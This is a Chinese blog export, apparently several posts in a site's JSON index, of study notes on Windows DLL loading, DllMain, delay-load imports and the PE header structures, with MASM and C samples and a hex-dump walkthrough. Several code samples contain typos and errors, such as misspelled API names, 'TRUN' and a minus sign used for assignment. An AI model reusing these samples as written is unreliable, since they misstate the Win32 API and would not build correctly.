不修改DLL中的RVA，以image的形式加载到进程中。常与LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE一起使用。 5.LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE 与LOAD_LIBRARY_AS_DATAFILE相同，不同的是独占打开，禁止其它进程访问和修改该DLL中的内容 显式卸载DLL模块当进程中的线程不需要DLL中的引用符号时，可以从进程的地址空间中显式卸载DLL，方法是调用以下函数： 1BOOL FreeLibrary(HINSTANCE hinstDll); 必须传递HINSTACE的值，以标识要卸载的DLL。该值是用来调用LoadLibrary(Ex)而返回的值。 也可以调用下面的函数从进程的地址空间中卸载DLL： 12345void FreeLibraryAndExitThread{ HINSTNCE hinstDll, DWORD dwExitCode}; 该函数是在Kernel32.dll中实现的： 12345VOID FreeLibraryAndExitThread(HINSTANCE hinstDll,DWORD dwExitCode){ FreeLibrary(hinstDll); ExiteThread(dwExitCode);} 假如你编写了一个DLL，当它被初次映射到进程的地址空间时，该DLL就创建一个线程。当线程完成操作以后，它用过调用FreeLibrary函数，从进程的地址空间卸载该DLL，并且终止运行，然后调用ExitThread函数。 再假如，线程分开调用FreeLibrary和ExitThread，就会出现问题，当调用FreeLibrary会立即从进程的地址空卸载DLL。当调用的FreeLibrary返回时，包含对ExitThread调用的代码就不可以再次使用，因此线程无法继续执行，这就会导致访问违规，同时整个线程终止运行。 但是如果当线程调用FreeLibraryAndExitThread，该函数调用FreeLibrary，但DLL立即被卸载。下一个执行的指令是在Kernel32.dll中，而不是刚卸载的DLL中，这意味着线程可以继续执行，并可以调用ExitThread。ExitThread使该线程终止运行并且不返回 为了从进程的地址空间中卸载DLL文件映像,进程中的线程必须两次调用FreeLibrary函数,第一次是将DLL的使用计数递减为1,第二次则是将DLL的使用计数递减为0,当系统发现DLL的使用计数为0时,它就从进程的地址空间中卸载DLL的文件映像,那么接下来试图调用这个DLL中的函数的任何线程都会产生违规访问. 系统为每一个进程维护一个DLL的使用计数,也就是说,如果进程A中的一个线程调用下面的函数,然后进程B中的一个线程调用相同的函数,那么MyLib.dll将被映射到两个进程的地址空间中,这样,进程A和B的DLL使用计数都将为1 1HINSTANCE hinstDll = LoadLibrary(&quot;Mydll.dll&quot;); 如果进程B中的线程继续调用下面的函数,那么进程B中的DLL使用计数将编程0,并且该DLL将会从进程B的地址空间卸载.而进程A不受影响.进程A的DLL使用计数仍然是1. 1FreeLibrary(Mydll.dll); 如果如果调用GetMoudleHandle,线程就能够确定DLL是否已经被映射到进程的地址空间中: 1HANSTANCE GetMoudleHandle(PCTSTR pszMoudleName) 例如,只有当MyLIb.dll尚未被加载到进程的地址空间时,下面这个才能加载该文件: 12345HINSTANCE hinstDll = GetMOudleHandle(&quot;Mylib&quot;);if(hinstDll == NULL){ hinstDll - LoadLibrary(&quot;Mylib&quot;);} 如果只有DLL的HINSTANCE值,那么可以调用GetMoudleFileName函数,确定DLL的全路径名: 12345DOWRD GetMoudleFileName( HINSTANCE hinstMoudle, //DLL或者exe的HINSTANCE PTSTR pszPathName, //该函数将文件映射的路径名放入的缓存地址 DOWRD cchPath //缓冲区的大小(字符为计量单位)); 显式链接到一个输出符号一旦DLL模块被显式加载,线程就必须获取它要引用的符号的地址,方法是调用下面的函数: 1234FARPROC GetProcAddress( HINSTANCE hinstDll, PCSTR pszSymbolName); 参数hinstDll是调用LoadLibrary(Ex)或GetMoudleHandle函数而返回地,它用于 设定包含符号的DLL的句柄.参数pszSymbolName可以采用两种方式. 以0结尾的字符串的地址,它包含了其地址的符号的名字 FARPROC pfn = GetProcAddress(hinstDll,”SomeFuncInDll”); 参数pszSymbolName的原型是PCSTR,而不是PCTSTR.这意味着GetProcaddress函数只接受ANSI字符串,绝不能将Unicode字符串传递给该函数. 指明逆向要其地址的符号的序号 FARPROC pfn = GetProcAddress(hinstDll,MAKEINTERSOURCE(2)); 这种用法假设你知道你需要的符号名被DLL创建程序赋予了序号值2. 这两种方法都能够提供包含在DLL中的必要符号的地址.如果DLL模块的输出节不存在你需要的符号,GetProcAddress就返回NULL,表示失败. DLL的进入点函数一个DLL可以拥有单个进入点函数.系统在不同的时间调用这个进入点的函数.这些调用可以用来提供一些信息,通常用户供DLL进行每个进程或线程的初始化和清除操作. 1234567891011121314151617BOOL WINAPI DllMain(HINSTANCE hinstDll, //加载后在进程中的虚拟地址 DWORD fwdReason, //系统因为什么调用该函数 PVOID fImpLoad) //差距啊吧是隐式还是动态加载该DLL{ switch(fdwReason) { case DLL_PROCESS_ATTACH: break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return (TRUE);} DLL_PROCESS_ATTACH只有第一次进程映射dll时才会触发此通知，之后的会增加dll的使用计数 此时DllMain的返回值表示初始化是否成功 DLL_PROCESS_DETACHDll从进程空间撤销映射时触发此通知，执行与进程相关的清理工作 如果是因为进程中的一个线程调用FreeLibrary而撤销映射，此线程将执行DllMain中的代码，处理完此通知之前，线程不会返回 Dll可能阻止进程的终止，只有当每个dll处理完此通知之后，进程才会终止 TerminateProcess 不会触发此通知调用dll的DllMain，从而没有机会进行清理共工作，所以应该避免使用此函数终止进程 LoadLibrary： FreeLibrary： DLL_THREAD_ATTACH进程创建线程时，映射到此进程的所有dll文件，会触发此通知调用DllMain，执行线程相关的初始化，而之后映射的dll（在创建线程之后）不会再触发此通知 另外，主线程不会调用此通知 DLL_THREAD_DETACHExitThread中止线程前会触发此通知执行与线程相关的清理工作 同理Dll可能会妨碍线程的终止，只有当每个dll处理完此通知，线程终止 同理TerminateThread尽量避免使用 由于DllMain的序列化调用，不要在DllMain中调用WaitForSingleObject 顺序调用DllMain系统是顺序调用DLL的DllMain函数的 这是一个死锁的例子： 123456789101112131415161718192021222324252627282930313233BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, PVOID fImpLoad) { HANDLE hThread; DWORD dwThreadId; switch (fdwReason) { case DLL_PROCESS_ATTACH: // The DLL is being mapped into the process' address space. // Create a thread to do some stuff. hThread = CreateThread(NULL, 0, SomeFunction, NULL, 0, &amp;dwThreadId); // Suspend our thread until the new thread terminates. WaitForSingleObject(hThread, INFINITE); // We no longer need access to the new thread. CloseHandle(hThread); break; case DLL_THREAD_ATTACH: // A thread is being created. break; case DLL_THREAD_DETACH: // A thread is exiting cleanly. break; case DLL_PROCESS_DETACH: // The DLL is being unmapped from the process' address space. break; } return TRUE; // Used only for DLL_PROCESS_ATTACH} 这段代码是存在缺陷得，当DllMain收到DLL_PROCESS_ATTACH得通知得时候，一个新的线程被创建了。系统必须用DLL_THREAD_ATTACH得值传递给DllMain函数。但是新线程被暂停运行，因为DLL_PROCESS_ATTACH被发送给DllMain函数得线程尚未完成操作，问题是调用WaitForSingleObject函数产生。WaitForSingleObject使当前正在运行得线程暂停运行，直到新线程运行，但是新线程没有机会运行，更不会停止，因为它处于暂停状态，等待当前线程退出DllMain函数。这个条件是死锁条件，两个线程永远处于暂停状态。 DllMain和C/C++运行期库不必在DLL源代码中实现DllMain函数。如果你并不拥有自己得DllMain函数，可以使用C/C++运行期库得DllMain函数得实现代码，它类似以下： 12345678BOOL WINAPI DllMain(HINSTANCE hinstDll,DWORD fdwReason,PVOID fImpLoad){ if(fdwReason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hinstDll); } return (TRUN);} 当链接程序链接DLL时，如果链接程序无法找到DLL得.obj文件中得DllMain函数，那么它就链接C/C++运行期库得DllMain函数实现代码。 延迟加载DLLVC6中提供了一个出色的特性，它能够使DLL操作边得更加容易。这个特性被称为延迟加载DLL。延迟加载的DLL是个隐含链接的DLL，它实际上要等到你的代码试图引用DLL中包含的某个符号才进行加载。 延迟加载DLL在以下情况非常有用： 如果你的程序使用多个DLL，那么它的初始化时间就长，因为加载程序需要将DLL映射到进程的地址空间中。解决办法就是运行时分开加载各个DLL，延迟加载的DLL能够更容易的完成这样的加载 如果调用代码中的一个新函数，然后试图在老版本的系统上运行你的程序，而该程序中没有该函数，那么加载程序就会报错，并且不允许该应用程序执行。 添加两个链接程序的开关： Lib:DelayImp.lib /DelayLoad:MyDll.dll lib开关告诉链接程序将使用一个特殊函数–delayLoadHelper嵌入你的可执行模块。 DelayLoad开关告诉程序以下事件： 从可执行模块的输入节中删除MyDll.dll，这样进程被初始化的时候，操作系统的加载程序就不会显式加载DLL 将新的(Delay Import)延迟输入节(.didata)嵌入可执行模块，以指明哪些函数正在从MyDll.dll输入 通过转移到对–DelayLoadHelper函数调用，转到对延迟加载函数的调用 延迟加载函数实际上是对–delayLoadHelper函数的调用，该函数引用特殊Delay Import节，并且知道调用LoadLibrary之后再调用GerProcAddress。 如果需要卸载延迟导入函数的时候，必须执行两个操作，首先当创建可执行文件时，必须一个链接程序开关。其次，必须修改源代码，并且再你想要卸载DLL时调用FUnloadDealyLoadedDLL函数： 1BOOL __FUnloadDelayLoadDLL(PCSTR szDLL); /Delay:unload链接程序开关告诉链接程序将另外一个节放入文件中。该节包含了你清除已经调用的函数时需要的信息，这样就可以再次调用–DelayLoadHelper函数，当调用–FUnloadDealyloadDll时，你将想要卸载的延迟加载的DLL的名字传递给它","link":"/2019/10/03/DLL%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF/"},{"title":"PE权威指南-PE延迟导入表","text":"Delay Load Import Table（延迟加载导入表）是PE中引入的专门用来描述与动态链接库延迟加载相关的数据，延迟加载导入表和导入表是相互分离的。与导入表不同的是，它记录的这些动态链接库并不会被操作系统的PE加载器加载。只有等到它登记的相关函数被应用程序调用时，PE中注册的延迟加载函数才会根据延迟加载导入表中对该函数的描述，动态加载相关链接并修正函数的AV地址，实现对函数调用 延迟加载导入的概念及其作用延迟加载导入是一种合理利用进程加载机制提高进程加载效率的技术，使用延迟加载导入能跳过加载前对引入函数的检测及加载后对IAT的修正。 延迟加载导入的使用场景： 提高应用程序加速速度 提供应用程序兼容性 提供应用程序可整合性 提高应用程序加载速度如果一个应用程序使用了很多的DLL，PE加载器在将程序映像加载到虚拟地址空间的时候，同时也会把所有的DLL一起提前加载到进程空间，而且在加载每个DLL时还会调用DLL的入口函数，对DLL进行初始化，这个时候并没有开始调用这些引入函数的动态链接库的函数。但是这些操作的存在使得进程加载的时候会耗费一些时间。 提高应用程序兼容性同一个DLL在不同的时候有不同的版本，新的DLL除了对原有函数继承和优化以外，通常还会增加一些新的函数。如果我们在应用程序中调用了一个DLL的新韩淑，运行时环境却存在的是老的DLL，那么加载时系统就会提示错误，然后拒绝执行应用程序。 提高应用程序可整合性在一个文件中与文件有关的配置信息、数据库、链接库等都放在一个文件里，这里的可整合性就是这样 PE中的延迟加载导入表在Windows XP SP3的大部分系统PE中，都存在延迟加载导入表函数。延迟加载导入表也vu你在双桥结构。 延迟加载导入表数据定位延迟加载导入数据为数据目录中注册的数据类型之一，其描述信息处于数据目录的第14个目录项中。 延迟加载导入描述符IMAGE_DELAY_IMPORT_DESCRIPOR详细描述如下： 1234567891011IMAGE_DELAY_IMPORT_DESCRIPOR struct{ Attributes dword ? ;//0000h,属性 Name dword ? ;//0004指向DLL名称的RVA ModuleHandle dowrd ?;//0008h DLL模块句柄的RVA DelayIAT dword ? ;//000ch 延迟加载导入IAT的RVA DelayINT dword ? ;//0010h 延迟加载导入INT的RVA BoundDelayIT dword ? ;//0014h 绑定延迟加载导入地址表的RVA UnloadDelayIT dword ? ;//0018h 卸载延迟加载导入地址表的RVA TimeStamp dword ? ;// 此映像绑定到DLL的时间戳}IMAGE_DELAY_IMPORT_DESCRIPOR ENDS Attributes属性未用，暂时未用，连接器在生成映像文件时将此字段设置为0.用户可以在将来扩展这个结构时用它指明添加了新字段，或者用它来指明延迟加载导入或卸载辅助函数 Name指向延迟加载导入的动态链接库名字字符串的地址，该地址是一个RVA。 ModuleHandle被延迟加载的DLL模块句柄的RVA。该RVA位于PE映像的数据节中，延迟加载辅助函数使用这个位置存储要被延迟加载的DLL的模块句柄 DelayIAT延迟加载导入地址表的RVA。延迟加载辅助函数用导入符号的实际地址来更新这些指针，以便起转换作用的这部分代码不会陷入循环调用之中。 DelayINT延迟加载导入名称表包含了可能需要被加载的导入符号的名称。它们的排列方式与IAT的函数指针一样，它们的结构与标准INT一样。 BoundDelayIT延迟绑定导入地址表（BIAT）是由IMAGE_THUNK_DATA结构组成的数组，它是可选的。 UnloadDelayIT延迟卸载导入地址表（UIAT）是由IMAGE_THUNK_DATA结构组成的数组，它是可选的。卸载代码用它来处理明确的 TimeStamp表示应用程序绑定到DLL的时间戳 延迟加载导入表实例分析源代码： 12345678910111213141516171819202122232425262728 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude MyDll.incincludelib MyDll.lib;数据段 .datadwFlag dd 1szText db 'HelloWorldPE',0;代码段 .codestart: mov eax,dwFlag .if eax==0 invoke sayHello .endif invoke MessageBox,NULL,offset szText,NULL,MB_OK invoke ExitProcess,NULL end start 123456789101112131415161718192000000800: 56 21 00 00 9c 21 00 00 1a 21 00 00 36 21 00 00 |V!...!...!..6!..|00000810: 48 21 00 00 64 21 00 00 7a 21 00 00 8c 21 00 00 |H!..d!..z!...!..|00000820: 00 00 00 00 00 21 00 00 00 00 00 00 00 00 00 00 |.....!..........|00000830: 4d 79 44 6c 6c 2e 64 6c 6c 00 00 00 00 00 00 00 |MyDll.dll.......|00000840: 30 20 40 00 1c 30 40 00 14 30 40 00 7c 20 40 00 |0 @..0@..0@.| @.|00000850: 90 20 40 00 00 00 00 00 00 00 00 00 00 00 00 00 |. @.............|00000860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|00000870: 00 00 00 00 00 00 00 00 00 00 00 00 84 20 40 00 |............. @.|00000880: 00 00 00 00 00 00 73 61 79 48 65 6c 6c 6f 00 00 |......sayHello..|00000890: 00 00 00 00 00 00 00 00 f8 20 00 00 00 00 00 00 |......... ......|000008a0: 00 00 00 00 0e 21 00 00 24 20 00 00 d4 20 00 00 |.....!..$ ... ..|000008b0: 00 00 00 00 00 00 00 00 28 21 00 00 00 20 00 00 |........(!... ..|000008c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|000008d0: 00 00 00 00 56 21 00 00 9c 21 00 00 1a 21 00 00 |....V!...!...!..|000008e0: 36 21 00 00 48 21 00 00 64 21 00 00 7a 21 00 00 |6!..H!..d!..z!..|000008f0: 8c 21 00 00 00 00 00 00 00 21 00 00 00 00 00 00 |.!.......!......| 30 20 40 00 IMAGE_DELAY_IMPORT_DESCRIPOR.name指向文件便宜0x00000830开始的字符串“MyDll.dll” 1C 30 40 00 IMAGE_DELAY_IMPORT_DESCRIPOR.ModuleHandle指向.data段，文件偏移0x00000a1c处，此处存放MyDll.dll的模块句柄 14 30 40 00 IMAGE_DELAY_IMPORT_DESCRIPOR.DelayIAT指向延迟加载导入的IAT，位于文件偏移的0x00000a14位置处。处于.data段，引号处运行时存放MyDll.dll的句柄 1200000a00: 01 00 00 00 48 65 6c 6c 6f 57 6f 72 6c 64 50 45 |....HelloWorldPE|00000a10: 00 00 00 00 32 10 40 00 00 00 00 00 &quot;00 00 00 00&quot; |....2.@.........| 7C 20 40 00 IMAGE_DELAY_IMPORT_DESCRIPOR.DelayINT指向了延迟加载导入的INT，位于文件偏移0x0000087c位置处，该段位于.rdata段。 90 20 40 00 IMAGE_DELAY_IMPORT_DESCRIPOR.BoundDelatIT指向了绑定延迟架子啊导入表，位于文件的偏移0x00000890位置处。该位置位于.rdata段 延迟加载导入机制详解系统开始运行程序时指定的延迟加载的DLL是不被载入的，只有等到程序调用了该动态链接库的函数时，系统才将该链接库载入内存空间，并执行相关函数代码。 延迟加载导入编程123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154.386.model flat,stdcalloption casemap:noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude comdlg32.incincludelib comdlg32.libinclude winResult.incincludelib winResult.libICO_MAIN equ 1000DLG_MAIN equ 1000IDC_INFO equ 1001IDM_MAIN equ 2000IDM_OPEN equ 2001IDM_EXIT equ 2002IDM_1 equ 4000IDM_2 equ 4001IDM_3 equ 4002IDB_WINRESULT equ 5000DLLTYPE equ 6000.datahInstance dd ?hRichEdit dd ?hWinMain dd ?hWinEdit dd ?szFileName db MAX_PATH dup(?)hRes dd ?hFile dd ?dwResSize dd ?lpRes dd ?.constszDllEdit db 'RichEd20.dll',0szDllName db 'winResult.dll',0szClassEdit db 'RichEdit20A',0szFont db '宋体',0.code;----------------;初始化窗口程序;----------------_init proc local @stCf:CHARFORMAT invoke GetDlgItem,hWinMain,IDC_INFO mov hWinEdit,eax invoke LoadIcon,hInstance,ICO_MAIN invoke SendMessage,hWinMain,WM_SETICON,ICON_BIG,eax ;为窗口设置图标 invoke SendMessage,hWinEdit,EM_SETTEXTMODE,TM_PLAINTEXT,0 ;设置编辑控件 invoke RtlZeroMemory,addr @stCf,sizeof @stCf mov @stCf.cbSize,sizeof @stCf mov @stCf.yHeight,9*20 mov @stCf.dwMask,CFM_FACE or CFM_SIZE or CFM_BOLD invoke lstrcpy,addr @stCf.szFaceName,addr szFont invoke SendMessage,hWinEdit,EM_SETCHARFORMAT,0,addr @stCf invoke SendMessage,hWinEdit,EM_EXLIMITTEXT,0,-1 ret_init endp;-------------------; 窗口程序;-------------------_ProcDlgMain proc uses ebx edi esi hWnd,wMsg,wParam,lParam mov eax,wMsg .if eax==WM_CLOSE invoke EndDialog,hWnd,NULL .elseif eax==WM_INITDIALOG ;初始化 push hWnd pop hWinMain invoke FadeInOpen,hWinMain call _init .elseif eax==WM_COMMAND ;菜单 mov eax,wParam .if eax==IDM_EXIT ;退出 invoke EndDialog,hWnd,NULL .elseif eax==IDM_OPEN ;打开文件 .elseif eax==IDM_1 .elseif eax==IDM_2 .elseif eax==IDM_3 .endif .else mov eax,FALSE ret .endif mov eax,TRUE ret_ProcDlgMain endp;--------------------------; 动态创建winResult.dll;--------------------------_createDll proc _hInstance local @dwWritten pushad ;寻找资源 invoke FindResource,_hInstance,IDB_WINRESULT,DLLTYPE .if eax mov hRes,eax invoke SizeofResource,_hInstance,eax ;获取资源尺寸 mov dwResSize,eax invoke LoadResource,_hInstance,hRes ;装入资源 .if eax invoke LockResource,eax ;锁定资源 .if eax mov lpRes,eax ;将资源内存地址给lpRes ;打开文件写入 invoke CreateFile,addr szDllName,GENERIC_WRITE,\\ FILE_SHARE_READ,\\ 0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0 mov hFile,eax invoke WriteFile,hFile,lpRes,dwResSize,\\ addr @dwWritten,NULL invoke CloseHandle,hFile .endif .endif .endif popad ret_createDll endpstart: invoke LoadLibrary,offset szDllEdit mov hRichEdit,eax invoke GetModuleHandle,NULL mov hInstance,eax invoke _createDll,hInstance ;在未调用DLL函数前先释放该DLL文件 invoke DialogBoxParam,hInstance,\\ DLG_MAIN,NULL,offset _ProcDlgMain,NULL invoke FreeLibrary,hRichEdit invoke ExitProcess,NULL end start 关于延迟加载导入的两个问题异常处理通常情况下，当操作系统的加载程序加载可执行模块时，它都会设法加载必要的DLL。如果一个DLL无法加载（比如不存在），那么加载程序就会显示一条错误消息。如果该DLL是通过延迟加载的DLL，在进行初始化时操作系统并不负责检查是否存在该DLL。如果调用延迟加载的函数无法找到该DLL，函数_delayLoadHelper就会引发一个异常。该异常可以使用结构化异常处理(SEH)方法捕获。 当函数_delayLoadHelper确实找到了DLL，但是要调用的函数却不在DLL中，就会出现另外的问题，也会抛出异常。 DLL的卸载如果程序调用完通过_delayLoadHelper加载的DLL文件的函数后，很长一段时间不需要该动态链接库，那么就释放该DLL，这要求程序开发者首先要在链接器的参数中假如-delayunload开关来设置允许对DLL的释放操作，该开关负责将另外一段代码FUnloadDelayLoadedDLL加入PE文件中，然后在需要释放DLL的代码位置调用该函数。 12345678-delayload ;在连接器中定义加载和卸载DLL的行为-delay:unload _delayLoadHelper(); 当用到延迟加载导入函数的时候，由_delayLoadHelper调用---LoadLibrary() ;_FUnloadDelayLoadedDLL() ;当需要卸载延迟导入的DLL时---FreeLibrary 千万不能自己调用FreeLibrary来卸载DLL，否则函数的地址将不会被清除，下次调用DLL的时候，就会产生违规操作。","link":"/2019/09/11/PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PE%E5%BB%B6%E8%BF%9F%E5%AF%BC%E5%85%A5%E8%A1%A8/"},{"title":"PE权威指南 - PE文件头","text":"PE头中记录了PE文件的所有数据的组织方式，通过PE文件头部分对某些数据结构描述，也可以定位不在文件头部的信息； PE文件头文件头基本概念在了解详细的PE头文件之前，需要了解几个基本的概念。 地址PE中的地址分为四类： 虚拟内存地址(VA) PE文件相对应的进程支配了自己独立的4gb虚拟空间，在这个空间定位的地址是VA，VA的范围是4GB。VA计算方式：进程基地址+RVA 相对虚拟内存地址(RVA) 同时加载到进程空间的文件，一个进程同时需要加载动态链接库就是模块，每个模块都有一个基地址，而RVA是针对于模块的概念，用来定位某个特殊位置距离某个模块基地址的偏移量 文件偏移地址(FOA) 与内存无关，它具体指某个位置距离文件头的偏移 特殊地址 指针PE数据结构中的指针的定义：从数据结构中某个字段存储的值为一个地址，那么这个字段就是一个指针； 数据目录PE文件中有一个数据结构为数据目录，其中记录了所有可能的数据类型，后续要学习的导入表等都存在于这个数据目录中； 节节是用于存放不同数据类型的地方，不同的节代表不同的访问权限。类似于内存中的内存四区； 对齐PE文件中规定了三类对齐：数据在内存中的对齐、数据在文件中的对齐、资源文件中资源数据的对齐； 内存对齐 Windows对内存属性设置以页为单位，对32位系统来说，这个值是4kb(1000h)，64位操作系统下，这个值是8kb(2000h)； 文件对齐 为了提高磁盘效率，通常以一个物理扇区的大小为对齐粒度，即512字节(200h) 资源数据对齐 资源字节码一般要求以双字(4字节)对齐 PE文件格式16位PE在16位系统中，PE文件大致可分为：DOS头和冗余数据。 DOS MZ头Windows PE中，DOS MZ头的定义如下： 1234567891011121314151617181920212223IMAGE_DOS_HEADER STRUCT { +0h WORD e_magic // Magic DOS signature MZ(4Dh 5Ah) EXE标志，“MZ” +2h WORD e_cblp // Bytes on last page of file 最后(部分)页中的字节数 +4h WORD e_cp // Pages in file 文件中全部和部分页数 +6h WORD e_crlc // Relocations 重定位表中的指针数 +8h WORD e_cparhdr // Size of header in paragraphs 头部尺寸，段落为单位 +0ah WORD e_minalloc // Minimun extra paragraphs needs 所需最小附加段 +0ch WORD e_maxalloc // Maximun extra paragraphs needs 所需最大附加段 +0eh WORD e_ss // intial(relative)SS value DOS代码的初始化堆栈SS +10h WORD e_sp // intial SP value DOS代码的初始化堆栈指针SP +12h WORD e_csum // Checksum 校验码 +14h WORD e_ip // intial IP value DOS代码的初始化指令入口[指针IP] +16h WORD e_cs // intial(relative)CS value DOS代码的初始堆栈入口 +18h WORD e_lfarlc // File Address of relocation table 重定位表的字节偏移量 +1ah WORD e_ovno // Overlay number 覆盖号 +1ch WORD e_res[4] // Reserved words 保留字 +24h WORD e_oemid // OEM identifier(for e_oeminfo) OEM标识符 +26h WORD e_oeminfo // OEM information;e_oemid specific OEM信息 +29h WORD e_res2[10] // Reserved words 保留字 +3ch DWORD e_lfanew // Offset to start of PE header 指向PE文件头 } IMAGE_DOS_HEADER ENDS DOS Stub在exe中，DOS Stub字节码如下： 这部分是该程序在DOS下运行的指令字节码，我们可以在反汇编中查看 这段话的功能主要就是调用int 21号中断，在屏幕输出一段字符串。 32位PE在32位系统中，DOS成为了冗余数据。在DOS中有一个字段规定了它必须写为”MZ”，即4D5A； 定位PE头PE头 = 基地址 + IMAGE_DOS_HEADER.e_lfanew 以我们的PE为例 PE结构 这样看PE就会觉得整个结构特别清晰，在32位下PE文件系统被划分为5个部分： DOS MZ头 DOS Stub PE头 节表 节内容 PE结构解析 标准的PE文件由四大部分组成： DOS头 PE头(IMAGE_NT_HEADERS) 节表(多个IMAGE_SECTION_HEADER结构) 节内容 PE头的数据结构最为复杂，包含： 4字节的表示符号 20字节的基本头信息 216字节的扩展头信息 12345typedef struct _IMAGE_NT_HEADERS { DWORD Signature; //4字节的表示符号 IMAGE_FILE_HEADER FileHeader; //20字节的基本头信息 IMAGE_OPTIONAL_HEADER32 OptionalHeader; //216字节的扩展头信息} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; PE文件头部 = DOS + PE头 + 节表 PE文件身体 = 节内容 PE头分析DOS头IMAGE_DOS_HEADER(64byte)12345678910111213141516171819202122IMAGE_DOS_HEADER STRUCT { +0h WORD e_magic // Magic DOS signature MZ(4Dh 5Ah) EXE标志，“MZ” +2h WORD e_cblp // Bytes on last page of file 最后(部分)页中的字节数 +4h WORD e_cp // Pages in file 文件中全部和部分页数 +6h WORD e_crlc // Relocations 重定位表中的指针数 +8h WORD e_cparhdr // Size of header in paragraphs 头部尺寸，段落为单位 +0ah WORD e_minalloc // Minimun extra paragraphs needs 所需最小附加段 +0ch WORD e_maxalloc // Maximun extra paragraphs needs 所需最大附加段 +0eh WORD e_ss // intial(relative)SS value DOS代码的初始化堆栈SS +10h WORD e_sp // intial SP value DOS代码的初始化堆栈指针SP +12h WORD e_csum // Checksum 校验码 +14h WORD e_ip // intial IP value DOS代码的初始化指令入口[指针IP] +16h WORD e_cs // intial(relative)CS value DOS代码的初始堆栈入口 +18h WORD e_lfarlc // File Address of relocation table 重定位表的字节偏移量 +1ah WORD e_ovno // Overlay number 覆盖号 +1ch WORD e_res[4] // Reserved words 保留字 +24h WORD e_oemid // OEM identifier(for e_oeminfo) OEM标识符 +26h WORD e_oeminfo // OEM information;e_oemid specific OEM信息 +29h WORD e_res2[10] // Reserved words 保留字 +3ch DWORD e_lfanew // Offset to start of PE header 指向PE文件头 } IMAGE_DOS_HEADER ENDS DOS MZ头的下面就是DOS Stub； PE头标识Signature(4byte)12345typedef struct _IMAGE_NT_HEADERS { DWORD Signature; //4字节的表示符号 IMAGE_FILE_HEADER FileHeader; //20字节的基本头信息 IMAGE_OPTIONAL_HEADER32 OptionalHeader; //216字节的扩展头信息} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 标准PE头IMAGE_FILE_HEADER(20byte)标准PE头位于PE头后，即位于IMAGE_DOS_HEADER的e_lfanew值+4的位置；此位置开始的20个字节位数据结构标准PE头IMAGE_FILE_HEADER的内容； 它记录了PE文件的全局属性； 123456789typedef struct _IMAGE_FILE_HEADER { WORD Machine; //+04h，运行平台 WORD NumberOfSections; //+06h，PE中节的数量 DWORD TimeDateStamp; //+08h，文件创建日期和时间 DWORD PointerToSymbolTable; //+0ch，指向符号表 DWORD NumberOfSymbols; //+10h，符号表中的符号数量 WORD SizeOfOptionalHeader; //+14h，扩展头结构的长度 WORD Characteristics; //+16h，文件属性} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 该结构通常用于判断PE文件是EXE还是DLL，不但可以通过该结构获得PE文件中节的总数量，还可以当成对节区信息进行循环遍历时的循环计数 扩展PE头IMAGE_OPTIONAL_HEADER32(224byte)1234567891011121314151617181920212223242526272829303132333435363738394041typedef struct _IMAGE_OPTIONAL_HEADER { // // Standard fields. // +18h WORD Magic; // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh） +1Ah BYTE MajorLinkerVersion; // 链接程序的主版本号 +1Bh BYTE MinorLinkerVersion; // 链接程序的次版本号 +1Ch DWORD SizeOfCode; // 所有含代码的节的总大小 +20h DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小 +24h DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 +28h DWORD AddressOfEntryPoint; // 程序执行入口RVA +2Ch DWORD BaseOfCode; // 代码的区块的起始RVA +30h DWORD BaseOfData; // 数据的区块的起始RVA // // NT additional fields. 以下是属于NT结构增加的领域。 // +34h DWORD ImageBase; // 程序的首选装载地址 +38h DWORD SectionAlignment; // 内存中的区块的对齐大小 +3Ch DWORD FileAlignment; // 文件中的区块的对齐大小 +40h WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 +42h WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号 +44h WORD MajorImageVersion; // 可运行于操作系统的主版本号 +46h WORD MinorImageVersion; // 可运行于操作系统的次版本号 +48h WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 +4Ah WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号 +4Ch DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为0 +50h DWORD SizeOfImage; // 映像装入内存后的总尺寸 +54h DWORD SizeOfHeaders; // 所有头 + 区块表的尺寸大小 +58h DWORD CheckSum; // 映像的校检和 +5Ch WORD Subsystem; // 可执行文件期望的子系统 +5Eh WORD DllCharacteristics; // DllMain()函数何时被调用，默认为 0 +60h DWORD SizeOfStackReserve; // 初始化时的栈大小 +64h DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 +68h DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 +6Ch DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 +70h DWORD LoaderFlags; // 与调试有关，默认为 0 +74h DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16 +78h IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 文件执行时的入口地址、文件被操作系统装载进入内存后的默认基地址 ，以及节在磁盘和内存中的对齐单位等信息均可以在此结构中找到。 